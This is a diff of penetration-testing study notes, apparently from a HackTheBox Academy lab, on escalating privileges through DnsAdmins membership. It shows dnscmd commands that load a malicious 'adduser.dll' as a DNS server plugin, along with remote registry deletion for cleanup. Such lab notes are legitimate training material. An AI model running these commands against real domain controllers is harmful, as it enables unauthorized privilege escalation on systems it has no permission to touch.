@@ -31,6 +31,7 @@ sudo python3 -m http.server 7777
 
 - Download the DLL to the target
 - Use the `dnscmd` utility to load a custom DLL with non-privileged user and...
+
 ```
 dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
 ( Access Denied )
@@ -38,6 +39,7 @@ dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
 
 - Only DnsAdmins are allowed to perform this, as expected. WHOOPS?
 - We need to load this DLL as a DnsAdmin:
+
 ```
 Get-ADGroupMember -Identity DnsAdmins
 dnscmd.exe /config /serverlevelplugindll C:\Users\netadmn\Desktop\adduser.dll
@@ -61,6 +63,7 @@ Here's an explaination of Security Descriptor Definition Language (SDDL) syntax:
 https://academy.hackthebox.com/module/49/section/1016
 
 ## Cleaning Up For Our Customer
+
 ```
 reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
 reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
